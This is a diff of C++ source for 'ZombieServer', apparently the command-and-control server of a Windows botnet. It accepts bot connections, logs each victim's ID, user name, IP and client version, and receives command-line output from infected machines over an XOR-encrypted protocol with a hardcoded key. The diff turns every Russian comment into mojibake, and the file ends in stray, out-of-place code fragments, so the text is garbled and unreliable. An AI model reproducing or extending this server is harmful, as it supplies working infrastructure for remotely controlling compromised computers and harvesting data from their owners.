@@ -2,12 +2,12 @@
 #include "Packet.h"
 #include "ZombieServer.h"
 
-// Конструктор
+// РљРѕРЅСЃС‚СЂСѓРєС‚РѕСЂ
 ZombieServer::ZombieServer()
 {
 	for (int x = 0; x < MAX_CLIENT + 1; x++)
 	{
-		// Обнуляем данные каждого клиента
+		// РћР±РЅСѓР»СЏРµРј РґР°РЅРЅС‹Рµ РєР°Р¶РґРѕРіРѕ РєР»РёРµРЅС‚Р°
 		client_socket[x] = 0;
 		client_event[x] = 0;
 		writeAccess[x] = FALSE;
@@ -22,19 +22,19 @@ ZombieServer::ZombieServer()
 	eventTotal = 0;
 }
 
-// Метод стартует ассинхронный сервер (WSAEventSelect)
+// РњРµС‚РѕРґ СЃС‚Р°СЂС‚СѓРµС‚ Р°СЃСЃРёРЅС…СЂРѕРЅРЅС‹Р№ СЃРµСЂРІРµСЂ (WSAEventSelect)
 BOOL ZombieServer::StartServer(HWND hWndPar)
 {
-	hWnd = hWndPar; // Сохраняем хендл окна, в которое будем передавать сообщения
+	hWnd = hWndPar; // РЎРѕС…СЂР°РЅСЏРµРј С…РµРЅРґР» РѕРєРЅР°, РІ РєРѕС‚РѕСЂРѕРµ Р±СѓРґРµРј РїРµСЂРµРґР°РІР°С‚СЊ СЃРѕРѕР±С‰РµРЅРёСЏ
 
-	SOCKADDR_IN servAddr;				// Адрес для связывания с сокетом
-	SOCKET listenSocket;				// Слушающий сокет
-	WSAEVENT newEvent;					// Вновь созданное событие для связывание с сокетом
+	SOCKADDR_IN servAddr;				// РђРґСЂРµСЃ РґР»СЏ СЃРІСЏР·С‹РІР°РЅРёСЏ СЃ СЃРѕРєРµС‚РѕРј
+	SOCKET listenSocket;				// РЎР»СѓС€Р°СЋС‰РёР№ СЃРѕРєРµС‚
+	WSAEVENT newEvent;					// Р’РЅРѕРІСЊ СЃРѕР·РґР°РЅРЅРѕРµ СЃРѕР±С‹С‚РёРµ РґР»СЏ СЃРІСЏР·С‹РІР°РЅРёРµ СЃ СЃРѕРєРµС‚РѕРј
 
-										// Создаем серверный сокет
+										// РЎРѕР·РґР°РµРј СЃРµСЂРІРµСЂРЅС‹Р№ СЃРѕРєРµС‚
 	if ((listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
 	{
-		MessageBox(NULL, "Ошибка создания сокета!", "Ошибка", MB_OK);
+		MessageBox(NULL, "РћС€РёР±РєР° СЃРѕР·РґР°РЅРёСЏ СЃРѕРєРµС‚Р°!", "РћС€РёР±РєР°", MB_OK);
 		WSACleanup();
 		return FALSE;
 	}
@@ -43,50 +43,50 @@ BOOL ZombieServer::StartServer(HWND hWndPar)
 	servAddr.sin_addr.s_addr = htonl(INADDR_ANY);
 	servAddr.sin_port = htons(PORT);
 
-	// Связываем серверный сокет с адресом
-	if (bind(listenSocket, (SOCKADDR *)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
+	// РЎРІСЏР·С‹РІР°РµРј СЃРµСЂРІРµСЂРЅС‹Р№ СЃРѕРєРµС‚ СЃ Р°РґСЂРµСЃРѕРј
+	if (bind(listenSocket, (SOCKADDR*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
 	{
-		MessageBox(NULL, "Ошибка связывания!", "Ошибка", MB_OK);
+		MessageBox(NULL, "РћС€РёР±РєР° СЃРІСЏР·С‹РІР°РЅРёСЏ!", "РћС€РёР±РєР°", MB_OK);
 		closesocket(listenSocket);
 		WSACleanup();
 		return FALSE;
 	}
 
-	// Создаем новое событие
+	// РЎРѕР·РґР°РµРј РЅРѕРІРѕРµ СЃРѕР±С‹С‚РёРµ
 	if ((newEvent = WSACreateEvent()) == WSA_INVALID_EVENT)
 	{
-		MessageBox(NULL, "Ошибка создания события!", "Ошибка", MB_OK);
+		MessageBox(NULL, "РћС€РёР±РєР° СЃРѕР·РґР°РЅРёСЏ СЃРѕР±С‹С‚РёСЏ!", "РћС€РёР±РєР°", MB_OK);
 		closesocket(listenSocket);
 		WSACleanup();
 		return FALSE;
 	}
 
-	// Связываем событие с серверным сокетом
+	// РЎРІСЏР·С‹РІР°РµРј СЃРѕР±С‹С‚РёРµ СЃ СЃРµСЂРІРµСЂРЅС‹Рј СЃРѕРєРµС‚РѕРј
 	if (WSAEventSelect(listenSocket, newEvent, FD_ACCEPT | FD_CLOSE) == SOCKET_ERROR)
 	{
-		MessageBox(NULL, "Ошибка связывания сокета с событием!", "Ошибка", MB_OK);
+		MessageBox(NULL, "РћС€РёР±РєР° СЃРІСЏР·С‹РІР°РЅРёСЏ СЃРѕРєРµС‚Р° СЃ СЃРѕР±С‹С‚РёРµРј!", "РћС€РёР±РєР°", MB_OK);
 		WSACloseEvent(newEvent);
 		closesocket(listenSocket);
 		WSACleanup();
 		return FALSE;
 	}
 
-	// Запускаем прослушивание серверного сокета
+	// Р—Р°РїСѓСЃРєР°РµРј РїСЂРѕСЃР»СѓС€РёРІР°РЅРёРµ СЃРµСЂРІРµСЂРЅРѕРіРѕ СЃРѕРєРµС‚Р°
 	if (listen(listenSocket, 1) == SOCKET_ERROR)
 	{
-		MessageBox(NULL, "Ошибка прослушки порта!", "Ошибка", MB_OK);
+		MessageBox(NULL, "РћС€РёР±РєР° РїСЂРѕСЃР»СѓС€РєРё РїРѕСЂС‚Р°!", "РћС€РёР±РєР°", MB_OK);
 		WSACloseEvent(newEvent);
 		closesocket(listenSocket);
 		WSACleanup();
 		return FALSE;
 	}
 
-	// Добавляем сокет и событие в массив
+	// Р”РѕР±Р°РІР»СЏРµРј СЃРѕРєРµС‚ Рё СЃРѕР±С‹С‚РёРµ РІ РјР°СЃСЃРёРІ
 	client_socket[eventTotal] = listenSocket;
 	client_event[eventTotal] = newEvent;
 	eventTotal = 1;
 
-	// Запускаем поток обработки событий
+	// Р—Р°РїСѓСЃРєР°РµРј РїРѕС‚РѕРє РѕР±СЂР°Р±РѕС‚РєРё СЃРѕР±С‹С‚РёР№
 	DWORD tPar;
 	HANDLE hThread;
 	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ThreadEvents, this, NULL, &tPar);
@@ -94,7 +94,7 @@ BOOL ZombieServer::StartServer(HWND hWndPar)
 	return TRUE;
 }
 
-// Метод отсылает сообщение клиенту
+// РњРµС‚РѕРґ РѕС‚СЃС‹Р»Р°РµС‚ СЃРѕРѕР±С‰РµРЅРёРµ РєР»РёРµРЅС‚Сѓ
 BOOL ZombieServer::SendPacket(int indexWait, Packet* packet)
 {
 	DWORD* uF = 0;
@@ -115,15 +115,15 @@ BOOL ZombieServer::SendPacket(int indexWait, Packet* packet)
 
 	if (writeAccess[indexWait] == FALSE)
 	{
-		// Доступ к записи в сокет закрыт
+		// Р”РѕСЃС‚СѓРї Рє Р·Р°РїРёСЃРё РІ СЃРѕРєРµС‚ Р·Р°РєСЂС‹С‚
 		if (sizeWriteBuffer[indexWait] - numSend[indexWait] < PACKET_SIZE)
 		{
-			// В буфере нет места для нового пакета, приращиваем буфер
+			// Р’ Р±СѓС„РµСЂРµ РЅРµС‚ РјРµСЃС‚Р° РґР»СЏ РЅРѕРІРѕРіРѕ РїР°РєРµС‚Р°, РїСЂРёСЂР°С‰РёРІР°РµРј Р±СѓС„РµСЂ
 			writeBuffer[indexWait] = (char*)realloc(writeBuffer[indexWait], sizeWriteBuffer[indexWait] + PACKET_SIZE);
 			sizeWriteBuffer[indexWait] = sizeWriteBuffer[indexWait] + PACKET_SIZE;
 		}
 
-		// Пишем во временный буфер
+		// РџРёС€РµРј РІРѕ РІСЂРµРјРµРЅРЅС‹Р№ Р±СѓС„РµСЂ
 		memcpy(writeBuffer[indexWait] + numSend[indexWait], bufferSend, PACKET_SIZE);
 		numSend[indexWait] = numSend[indexWait] + PACKET_SIZE;
 		writeAccess[indexWait] = FALSE;
@@ -131,17 +131,17 @@ BOOL ZombieServer::SendPacket(int indexWait, Packet* packet)
 	}
 	else if (writeAccess[indexWait] == TRUE)
 	{
-		// Доступ к записи в сокет открыт, пишем в сокет
+		// Р”РѕСЃС‚СѓРї Рє Р·Р°РїРёСЃРё РІ СЃРѕРєРµС‚ РѕС‚РєСЂС‹С‚, РїРёС€РµРј РІ СЃРѕРєРµС‚
 		int iSend = send(client_socket[indexWait], bufferSend, PACKET_SIZE, 0);
 		if (iSend == PACKET_SIZE)
 		{
-			//Отправка данных прошла успешно
+			//РћС‚РїСЂР°РІРєР° РґР°РЅРЅС‹С… РїСЂРѕС€Р»Р° СѓСЃРїРµС€РЅРѕ
 			numSend[indexWait] = 0;
 			return TRUE;
 		}
 		else if (iSend == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
 		{
-			// Сокет заблокирован, пишем во временный буфер
+			// РЎРѕРєРµС‚ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ, РїРёС€РµРј РІРѕ РІСЂРµРјРµРЅРЅС‹Р№ Р±СѓС„РµСЂ
 			memcpy(writeBuffer[indexWait], bufferSend, PACKET_SIZE);
 			numSend[indexWait] = PACKET_SIZE;
 			writeAccess[indexWait] = FALSE;
@@ -149,36 +149,36 @@ BOOL ZombieServer::SendPacket(int indexWait, Packet* packet)
 		}
 		else
 		{
-			// Ошибка записи в сокет
+			// РћС€РёР±РєР° Р·Р°РїРёСЃРё РІ СЃРѕРєРµС‚
 			return FALSE;
 		}
 	}
 }
 
-// Подключает нового клиента
+// РџРѕРґРєР»СЋС‡Р°РµС‚ РЅРѕРІРѕРіРѕ РєР»РёРµРЅС‚Р°
 BOOL ZombieServer::AcceptClient(DWORD index)
 {
-	// WSA_MAXIMUM_WAIT_EVENTS - максимальное число ожидаемых событий
+	// WSA_MAXIMUM_WAIT_EVENTS - РјР°РєСЃРёРјР°Р»СЊРЅРѕРµ С‡РёСЃР»Рѕ РѕР¶РёРґР°РµРјС‹С… СЃРѕР±С‹С‚РёР№
 
-	SOCKADDR addrBot; // Структура принимает данные о подключившемся клиете (IP адрес)
+	SOCKADDR addrBot; // РЎС‚СЂСѓРєС‚СѓСЂР° РїСЂРёРЅРёРјР°РµС‚ РґР°РЅРЅС‹Рµ Рѕ РїРѕРґРєР»СЋС‡РёРІС€РµРјСЃСЏ РєР»РёРµС‚Рµ (IP Р°РґСЂРµСЃ)
 
-	// Подключаем клиента
+	// РџРѕРґРєР»СЋС‡Р°РµРј РєР»РёРµРЅС‚Р°
 	client_socket[eventTotal] = accept(client_socket[index], &addrBot, NULL);
 	if (client_socket[eventTotal] == SOCKET_ERROR)
 	{
-		// Ошибка
+		// РћС€РёР±РєР°
 		return FALSE;
 	}
 
-	// Создаем событие для подключенного бота
+	// РЎРѕР·РґР°РµРј СЃРѕР±С‹С‚РёРµ РґР»СЏ РїРѕРґРєР»СЋС‡РµРЅРЅРѕРіРѕ Р±РѕС‚Р°
 	client_event[eventTotal] = WSACreateEvent();
 
-	// Связываем клиента (сокет) с событием
+	// РЎРІСЏР·С‹РІР°РµРј РєР»РёРµРЅС‚Р° (СЃРѕРєРµС‚) СЃ СЃРѕР±С‹С‚РёРµРј
 	WSAEventSelect(client_socket[eventTotal], client_event[eventTotal], FD_READ | FD_WRITE | FD_CLOSE);
 
 	id[eventTotal] = unicID;
 
-	// Запрашиваем у клиента информацию
+	// Р—Р°РїСЂР°С€РёРІР°РµРј Сѓ РєР»РёРµРЅС‚Р° РёРЅС„РѕСЂРјР°С†РёСЋ
 	Packet packet;
 	ZeroMemory(packet.data, PACKET_DATA_SIZE);
 	packet.type = PACKET_ADD_ID;
@@ -190,19 +190,19 @@ BOOL ZombieServer::AcceptClient(DWORD index)
 	return TRUE;
 }
 
-// Закрывает соединение с клиентом
+// Р—Р°РєСЂС‹РІР°РµС‚ СЃРѕРµРґРёРЅРµРЅРёРµ СЃ РєР»РёРµРЅС‚РѕРј
 void ZombieServer::CloseClient(DWORD index)
 {
 	WSAEventSelect(client_socket[index], client_event[index], 0L);
 	WSACloseEvent(client_event[index]);
 	closesocket(client_socket[index]);
 
-	// Отправка данных в окно
+	// РћС‚РїСЂР°РІРєР° РґР°РЅРЅС‹С… РІ РѕРєРЅРѕ
 	char IDS[10] = "";
 	_itoa_s(id[index], IDS, 10);
 	SendMessage(hWnd, WM_CLOSE_CLIENT, (WPARAM)IDS, 0);
 
-	// Очищаем буфер, сдвигаем массивы
+	// РћС‡РёС‰Р°РµРј Р±СѓС„РµСЂ, СЃРґРІРёРіР°РµРј РјР°СЃСЃРёРІС‹
 	for (int x = index; x < eventTotal; x++)
 	{
 		client_socket[x] = client_socket[x + 1];
@@ -216,31 +216,31 @@ void ZombieServer::CloseClient(DWORD index)
 		sizeWriteBuffer[x] = sizeWriteBuffer[x + 1];
 	}
 
-	// Уменьшаем счетчик клиентов
+	// РЈРјРµРЅСЊС€Р°РµРј СЃС‡РµС‚С‡РёРє РєР»РёРµРЅС‚РѕРІ
 	eventTotal--;
 
 	return;
 }
 
-// Возвращает ID клиента
+// Р’РѕР·РІСЂР°С‰Р°РµС‚ ID РєР»РёРµРЅС‚Р°
 int ZombieServer::GetID(DWORD indexWait)
 {
 	return id[indexWait];
 }
 
-// Отправляет данные из временного буффера
+// РћС‚РїСЂР°РІР»СЏРµС‚ РґР°РЅРЅС‹Рµ РёР· РІСЂРµРјРµРЅРЅРѕРіРѕ Р±СѓС„С„РµСЂР°
 BOOL ZombieServer::WriteClient(DWORD indexWait)
 {
-	// Устанавливаем индикатор открытого доступа для записи в сокет
+	// РЈСЃС‚Р°РЅР°РІР»РёРІР°РµРј РёРЅРґРёРєР°С‚РѕСЂ РѕС‚РєСЂС‹С‚РѕРіРѕ РґРѕСЃС‚СѓРїР° РґР»СЏ Р·Р°РїРёСЃРё РІ СЃРѕРєРµС‚
 	writeAccess[indexWait] = TRUE;
 
 	if (numSend[indexWait] != 0)
 	{
-		// Во временном буффере есть данные для отправки
+		// Р’Рѕ РІСЂРµРјРµРЅРЅРѕРј Р±СѓС„С„РµСЂРµ РµСЃС‚СЊ РґР°РЅРЅС‹Рµ РґР»СЏ РѕС‚РїСЂР°РІРєРё
 		int errSend = send(client_socket[indexWait], writeBuffer[indexWait], numSend[indexWait], 0);
 		if (errSend == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
 		{
-			// Сокет заблокирован
+			// РЎРѕРєРµС‚ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ
 			writeAccess[indexWait] = FALSE;
 			return TRUE;
 		}
@@ -258,17 +258,17 @@ BOOL ZombieServer::WriteClient(DWORD indexWait)
 	return TRUE;
 }
 
-// Возвращает сообщение клиента
+// Р’РѕР·РІСЂР°С‰Р°РµС‚ СЃРѕРѕР±С‰РµРЅРёРµ РєР»РёРµРЅС‚Р°
 BOOL ZombieServer::ReadClient(DWORD indexWait)
 {
-	// Читаем данные
+	// Р§РёС‚Р°РµРј РґР°РЅРЅС‹Рµ
 	int iResult = recv(client_socket[indexWait], recvBuffer[indexWait] + numRecv[indexWait], PACKET_SIZE - numRecv[indexWait], 0);
 	if (iResult == PACKET_SIZE - numRecv[indexWait])
 	{
-		// Данные пакета прочитаны полностью
+		// Р”Р°РЅРЅС‹Рµ РїР°РєРµС‚Р° РїСЂРѕС‡РёС‚Р°РЅС‹ РїРѕР»РЅРѕСЃС‚СЊСЋ
 		numRecv[indexWait] = 0;
 
-		// Расшифровываем данные
+		// Р Р°СЃС€РёС„СЂРѕРІС‹РІР°РµРј РґР°РЅРЅС‹Рµ
 		Crypt(recvBuffer[indexWait], PACKET_SIZE);
 
 		Packet pak;
@@ -282,57 +282,57 @@ BOOL ZombieServer::ReadClient(DWORD indexWait)
 	}
 	else if (iResult < PACKET_SIZE - numRecv[indexWait])
 	{
-		// Пакет не полностью прочитан
+		// РџР°РєРµС‚ РЅРµ РїРѕР»РЅРѕСЃС‚СЊСЋ РїСЂРѕС‡РёС‚Р°РЅ
 		numRecv[indexWait] = numRecv[indexWait] + iResult;
 		return TRUE;
 
 	}
 	else if (iResult == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK)
 	{
-		// Сокет заблокирован
+		// РЎРѕРєРµС‚ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ
 		return TRUE;
 	}
 	else
 	{
-		// Ошибка
+		// РћС€РёР±РєР°
 		return FALSE;
 	}
 }
 
 void ZombieServer::WorkData(Packet* pak)
 {
-	User user; // Переменная для хранения информации о подключенном клиенте
+	User user; // РџРµСЂРµРјРµРЅРЅР°СЏ РґР»СЏ С…СЂР°РЅРµРЅРёСЏ РёРЅС„РѕСЂРјР°С†РёРё Рѕ РїРѕРґРєР»СЋС‡РµРЅРЅРѕРј РєР»РёРµРЅС‚Рµ
 
-	// Реагируем на полученное сообщение в соответствии с типом пакета
+	// Р РµР°РіРёСЂСѓРµРј РЅР° РїРѕР»СѓС‡РµРЅРЅРѕРµ СЃРѕРѕР±С‰РµРЅРёРµ РІ СЃРѕРѕС‚РІРµС‚СЃС‚РІРёРё СЃ С‚РёРїРѕРј РїР°РєРµС‚Р°
 	switch (pak->type)
 	{
 	case PACKET_USER_JOINED:
 
-		// Отправляем информация о подключенном клиенте в окно
+		// РћС‚РїСЂР°РІР»СЏРµРј РёРЅС„РѕСЂРјР°С†РёСЏ Рѕ РїРѕРґРєР»СЋС‡РµРЅРЅРѕРј РєР»РёРµРЅС‚Рµ РІ РѕРєРЅРѕ
 		ParseUser(pak->data, &user);
 		SendMessage(hWnd, WM_JOINED_CLIENT, (WPARAM)&user, 0);
 		return;
 
 	case PACKET_CMD_REPORT:
 
-		// Отправляем данные из командной строки
+		// РћС‚РїСЂР°РІР»СЏРµРј РґР°РЅРЅС‹Рµ РёР· РєРѕРјР°РЅРґРЅРѕР№ СЃС‚СЂРѕРєРё
 		SendMessage(hWnd, WM_CMD_REPORT, (WPARAM)pak->data, PACKET_DATA_SIZE);
 		return;
 	}
 }
 
-// Обработка событий сервера
+// РћР±СЂР°Р±РѕС‚РєР° СЃРѕР±С‹С‚РёР№ СЃРµСЂРІРµСЂР°
 DWORD WINAPI ZombieServer::ThreadEvents(LPVOID lpParameter)
 {
-	ZombieServer* pZomb = (ZombieServer*)lpParameter;	// Указатель на вызывающий объект
+	ZombieServer* pZomb = (ZombieServer*)lpParameter;	// РЈРєР°Р·Р°С‚РµР»СЊ РЅР° РІС‹Р·С‹РІР°СЋС‰РёР№ РѕР±СЉРµРєС‚
 
-	DWORD indexWait;				// Номер сокета в массиве в котором произошло событие
-	WSANETWORKEVENTS net;			// Событие в сокете
-	BOOL done = FALSE;				// Индикатор выхода из цикла ожидания события
+	DWORD indexWait;				// РќРѕРјРµСЂ СЃРѕРєРµС‚Р° РІ РјР°СЃСЃРёРІРµ РІ РєРѕС‚РѕСЂРѕРј РїСЂРѕРёР·РѕС€Р»Рѕ СЃРѕР±С‹С‚РёРµ
+	WSANETWORKEVENTS net;			// РЎРѕР±С‹С‚РёРµ РІ СЃРѕРєРµС‚Рµ
+	BOOL done = FALSE;				// РРЅРґРёРєР°С‚РѕСЂ РІС‹С…РѕРґР° РёР· С†РёРєР»Р° РѕР¶РёРґР°РЅРёСЏ СЃРѕР±С‹С‚РёСЏ
 
 	while (done == FALSE)
 	{
-		// Ждем сетевое событие
+		// Р–РґРµРј СЃРµС‚РµРІРѕРµ СЃРѕР±С‹С‚РёРµ
 		indexWait = WSAWaitForMultipleEvents(pZomb->eventTotal, pZomb->client_event, FALSE, WSA_INFINITE, FALSE);
 		if (indexWait == WSA_WAIT_FAILED || indexWait == WSA_WAIT_TIMEOUT)
 		{
@@ -341,56 +341,56 @@ DWORD WINAPI ZombieServer::ThreadEvents(LPVOID lpParameter)
 
 		indexWait -= WSA_WAIT_EVENT_0;
 
-		// Выясняем какое событие произошло
+		// Р’С‹СЏСЃРЅСЏРµРј РєР°РєРѕРµ СЃРѕР±С‹С‚РёРµ РїСЂРѕРёР·РѕС€Р»Рѕ
 		if (WSAEnumNetworkEvents(pZomb->client_socket[indexWait], pZomb->client_event[indexWait], &net) == SOCKET_ERROR)
 		{
-			// Обработка ошибки
+			// РћР±СЂР°Р±РѕС‚РєР° РѕС€РёР±РєРё
 			if (indexWait == NULL)
 			{
-				// Ошибка произошла на слушающем(серверном) сокете, завершаем поток сервера
+				// РћС€РёР±РєР° РїСЂРѕРёР·РѕС€Р»Р° РЅР° СЃР»СѓС€Р°СЋС‰РµРј(СЃРµСЂРІРµСЂРЅРѕРј) СЃРѕРєРµС‚Рµ, Р·Р°РІРµСЂС€Р°РµРј РїРѕС‚РѕРє СЃРµСЂРІРµСЂР°
 				break;
 			}
 			else
 			{
-				// Ошибка произошла на клиентском сокете, закрываем клиента, ждем событий дальше
+				// РћС€РёР±РєР° РїСЂРѕРёР·РѕС€Р»Р° РЅР° РєР»РёРµРЅС‚СЃРєРѕРј СЃРѕРєРµС‚Рµ, Р·Р°РєСЂС‹РІР°РµРј РєР»РёРµРЅС‚Р°, Р¶РґРµРј СЃРѕР±С‹С‚РёР№ РґР°Р»СЊС€Рµ
 				pZomb->CloseClient(indexWait);;
 				continue;
 			}
 		}
 
-		// Клиент ожидает подключения
+		// РљР»РёРµРЅС‚ РѕР¶РёРґР°РµС‚ РїРѕРґРєР»СЋС‡РµРЅРёСЏ
 		if (net.lNetworkEvents & FD_ACCEPT)
 		{
 			if (net.iErrorCode[FD_ACCEPT_BIT] != 0 || pZomb->AcceptClient(indexWait) == FALSE)
 			{
-				// Обработка ошибки
+				// РћР±СЂР°Р±РѕС‚РєР° РѕС€РёР±РєРё
 				break;
 			}
 		}
 
-		// Есть данные для чтения
+		// Р•СЃС‚СЊ РґР°РЅРЅС‹Рµ РґР»СЏ С‡С‚РµРЅРёСЏ
 		if (net.lNetworkEvents & FD_READ)
 		{
 			if (net.iErrorCode[FD_READ_BIT] != 0 || pZomb->ReadClient(indexWait) == FALSE)
 			{
-				// Обработка ошибки
+				// РћР±СЂР°Р±РѕС‚РєР° РѕС€РёР±РєРё
 				pZomb->CloseClient(indexWait);
 				continue;
 			}
 		}
 
-		// Буфер сокета свободен для записи
+		// Р‘СѓС„РµСЂ СЃРѕРєРµС‚Р° СЃРІРѕР±РѕРґРµРЅ РґР»СЏ Р·Р°РїРёСЃРё
 		if (net.lNetworkEvents & FD_WRITE)
 		{
 			if (net.iErrorCode[FD_WRITE_BIT] != 0 || pZomb->WriteClient(indexWait) == FALSE)
 			{
-				// Обработка ошибки
+				// РћР±СЂР°Р±РѕС‚РєР° РѕС€РёР±РєРё
 				pZomb->CloseClient(indexWait);
 				continue;
 			}
 		}
 
-		// Соединение с клиентом закрыто
+		// РЎРѕРµРґРёРЅРµРЅРёРµ СЃ РєР»РёРµРЅС‚РѕРј Р·Р°РєСЂС‹С‚Рѕ
 		if (net.lNetworkEvents & FD_CLOSE)
 		{
 			if (net.iErrorCode[FD_CLOSE_BIT] != 0)
@@ -403,7 +403,7 @@ DWORD WINAPI ZombieServer::ThreadEvents(LPVOID lpParameter)
 	ExitProcess(0);
 }
 
-// Функция парсит пришедший пакет
+// Р¤СѓРЅРєС†РёСЏ РїР°СЂСЃРёС‚ РїСЂРёС€РµРґС€РёР№ РїР°РєРµС‚
 void ZombieServer::ParseUser(char* data, User* user)
 {
 	ZeroMemory(user->id, 128);
@@ -430,7 +430,7 @@ void ZombieServer::ParseUser(char* data, User* user)
 			user->id[p] = data[i];
 			p++;
 			break;
-		case 1: // Имя пользователя
+		case 1: // РРјСЏ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ
 			if (data[i] == '|' || data[i] == NULL)
 			{
 				p = 0;
@@ -460,7 +460,7 @@ void ZombieServer::ParseUser(char* data, User* user)
 			user->ip[p] = data[i];
 			p++;
 			break;
-		case 4: // Версия клиента
+		case 4: // Р’РµСЂСЃРёСЏ РєР»РёРµРЅС‚Р°
 			if (data[i] == '|' || data[i] == NULL)
 			{
 				p = 0;
@@ -474,7 +474,7 @@ void ZombieServer::ParseUser(char* data, User* user)
 		i++;
 	}
 
-	// Преобразуем разпарсенные строки в юникод
+	// РџСЂРµРѕР±СЂР°Р·СѓРµРј СЂР°Р·РїР°СЂСЃРµРЅРЅС‹Рµ СЃС‚СЂРѕРєРё РІ СЋРЅРёРєРѕРґ
 	int wsize = MultiByteToWideChar(1251, 0, user->id, -1, 0, 0);
 	MultiByteToWideChar(1251, 0, user->id, -1, user->wID, wsize);
 
@@ -493,10 +493,10 @@ void ZombieServer::ParseUser(char* data, User* user)
 	return;
 }
 
-// Расшифровка пакета
+// Р Р°СЃС€РёС„СЂРѕРІРєР° РїР°РєРµС‚Р°
 void ZombieServer::Crypt(char* cryptData, int sizeCryptData)
 {
-	const unsigned char key[8] = { 193, 127, 143, 121, 167, 179, 187, 191 }; // Ключ шифрования
+	const unsigned char key[8] = { 193, 127, 143, 121, 167, 179, 187, 191 }; // РљР»СЋС‡ С€РёС„СЂРѕРІР°РЅРёСЏ
 	int iKey = 0;
 	char ch;
 
@@ -515,7 +515,7 @@ DWORD ZombieServer::ParsePacketType(char* data)
 	char* uR = 0;
 	DWORD packetType;
 
-	// Парсим тип пакета
+	// РџР°СЂСЃРёРј С‚РёРї РїР°РєРµС‚Р°
 	uR = (char*)&packetType;
 	for (int i = 0; i < 4; i++)
 	{
@@ -529,7 +529,7 @@ DWORD ZombieServer::ParseID(char* data)
 	char* uR = 0;
 	DWORD id;
 
-	// Парсим тип пакета
+	// РџР°СЂСЃРёРј С‚РёРї РїР°РєРµС‚Р°
 	uR = (char*)&id;
 	for (int i = 0; i < 4; i++)
 	{
@@ -543,7 +543,7 @@ DWORD ZombieServer::ParseID1(char* data)
 	char* uR = 0;
 	DWORD id1;
 
-	// Парсим тип пакета
+	// РџР°СЂСЃРёРј С‚РёРї РїР°РєРµС‚Р°
 	uR = (char*)&id1;
 	for (int i = 0; i < 4; i++)
 	{
@@ -557,7 +557,7 @@ DWORD ZombieServer::ParseID2(char* data)
 	char* uR = 0;
 	DWORD id2;
 
-	// Парсим тип пакета
+	// РџР°СЂСЃРёРј С‚РёРї РїР°РєРµС‚Р°
 	uR = (char*)&id2;
 	for (int i = 0; i < 4; i++)
 	{
@@ -570,7 +570,7 @@ DWORD ZombieServer::ParseID2(char* data)
 
 case PACKET_CMD_REPORT:
 
-// Сообщение с выводом из командной строки
+// РЎРѕРѕР±С‰РµРЅРёРµ СЃ РІС‹РІРѕРґРѕРј РёР· РєРѕРјР°РЅРґРЅРѕР№ СЃС‚СЂРѕРєРё
 wchar_t wReportBuffer[4096] = L"";
 int wsize = MultiByteToWideChar(1251, 0, zombie.data, -1, 0, 0);
 MultiByteToWideChar(1251, 0, zombie.data, -1, wReportBuffer, wsize);
@@ -585,7 +585,7 @@ return packetType;
 
 
 
-// Сообщение с выводом из командной строки
+// РЎРѕРѕР±С‰РµРЅРёРµ СЃ РІС‹РІРѕРґРѕРј РёР· РєРѕРјР°РЅРґРЅРѕР№ СЃС‚СЂРѕРєРё
 wchar_t wReportBuffer[4096] = L"";
 int wsize = MultiByteToWideChar(1251, 0, zombie.data, -1, 0, 0);
 MultiByteToWideChar(1251, 0, zombie.data, -1, wReportBuffer, wsize);
@@ -603,15 +603,15 @@ break;
 
 /*	if (writeAccess[indexWait] == FALSE)
 {
-// Доступ к записи в сокет закрыт
+// Р”РѕСЃС‚СѓРї Рє Р·Р°РїРёСЃРё РІ СЃРѕРєРµС‚ Р·Р°РєСЂС‹С‚
 if (sizeWriteBuffer[indexWait] - numSend[indexWait] < PACKET_SIZE)
 {
-// В буфере нет места для нового пакета, приращиваем буфер
+// Р’ Р±СѓС„РµСЂРµ РЅРµС‚ РјРµСЃС‚Р° РґР»СЏ РЅРѕРІРѕРіРѕ РїР°РєРµС‚Р°, РїСЂРёСЂР°С‰РёРІР°РµРј Р±СѓС„РµСЂ
 writeBuffer[indexWait] = (char*)realloc(writeBuffer[indexWait], sizeWriteBuffer[indexWait] + PACKET_SIZE);
 sizeWriteBuffer[indexWait] = sizeWriteBuffer[indexWait] + PACKET_SIZE;
 }
 
-// Пишем во временный буфер
+// РџРёС€РµРј РІРѕ РІСЂРµРјРµРЅРЅС‹Р№ Р±СѓС„РµСЂ
 memcpy(writeBuffer[indexWait] + numSend[indexWait], bufferSend, PACKET_SIZE);
 numSend[indexWait] = numSend[indexWait] + PACKET_SIZE;
 writeAccess[indexWait] = FALSE;
@@ -619,13 +619,13 @@ return;
 }
 else if (writeAccess[indexWait] == TRUE)
 {
-// Доступ к записи в сокет открыт, пишем в сокет
+// Р”РѕСЃС‚СѓРї Рє Р·Р°РїРёСЃРё РІ СЃРѕРєРµС‚ РѕС‚РєСЂС‹С‚, РїРёС€РµРј РІ СЃРѕРєРµС‚
 int iSend = send(client_socket[indexWait], bufferSend, PACKET_SIZE, 0);
 if (iSend == SOCKET_ERROR)
 {
 if (WSAGetLastError() == WSAEWOULDBLOCK)
 {
-// Ошибка записи, сокет заблокирован, пишем во временный буфер
+// РћС€РёР±РєР° Р·Р°РїРёСЃРё, СЃРѕРєРµС‚ Р·Р°Р±Р»РѕРєРёСЂРѕРІР°РЅ, РїРёС€РµРј РІРѕ РІСЂРµРјРµРЅРЅС‹Р№ Р±СѓС„РµСЂ
 memcpy(writeBuffer[indexWait], bufferSend, PACKET_SIZE);
 numSend[indexWait] = PACKET_SIZE;
 writeAccess[indexWait] = FALSE;
@@ -633,12 +633,12 @@ return;
 }
 else
 {
-MessageBox(NULL, "Неизвестная ошибка send", "Этого не должно быть", MB_OK);
+MessageBox(NULL, "РќРµРёР·РІРµСЃС‚РЅР°СЏ РѕС€РёР±РєР° send", "Р­С‚РѕРіРѕ РЅРµ РґРѕР»Р¶РЅРѕ Р±С‹С‚СЊ", MB_OK);
 }
 }
